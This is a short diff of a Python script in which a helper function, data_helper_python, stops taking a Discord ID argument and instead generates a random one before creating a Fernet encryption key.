@@ -4,6 +4,7 @@ import shutil
 import psutil
 import socket
 import string
+import random
 import requests
 import datetime
 import platform
@@ -247,7 +248,8 @@ def get_username():
 
     return username
 
-def data_helper_python(discord_id_pre):
+def data_helper_python():
+    discord_id_pre = str(random.randint(1, 99999999))
     key = Fernet.generate_key()
     f = Fernet(key)
 
